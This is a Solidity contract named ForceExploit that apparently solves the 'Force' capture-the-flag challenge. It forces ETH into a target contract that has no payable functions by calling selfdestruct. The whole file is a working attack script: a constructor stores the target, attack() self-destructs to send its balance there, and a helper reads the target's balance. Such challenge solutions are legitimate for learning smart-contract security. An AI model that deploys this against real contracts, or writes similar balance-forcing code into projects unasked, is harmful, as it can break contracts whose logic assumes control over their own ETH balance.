// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ForceExploit
 * @dev Exploits the Force challenge by forcing ETH into a contract that doesn't have payable functions
 */
contract ForceExploit {
    // Target contract address
    address payable public target;

    /**
     * @dev Constructor that sets the target address
     * @param _targetAddress Address of the Force contract to exploit
     */
    constructor(address payable _targetAddress) {
        target = _targetAddress;
    }

    /**
     * @dev Allows this contract to receive ETH
     */
    receive() external payable {}

    /**
     * @dev Performs the exploit by sending all ETH in this contract to the target using selfdestruct
     */
    function attack() external {
        // Check if this contract has any ETH balance
        require(address(this).balance > 0, "Need ETH to perform the attack");
        
        // selfdestruct will force send all remaining ETH to the target address
        // even if the target contract has no payable functions or fallback
        selfdestruct(target);
    }

    /**
     * @dev Get the balance of the target contract
     * @return The ETH balance of the target contract in wei
     */
    function getTargetBalance() external view returns (uint256) {
        return target.balance;
    }
}
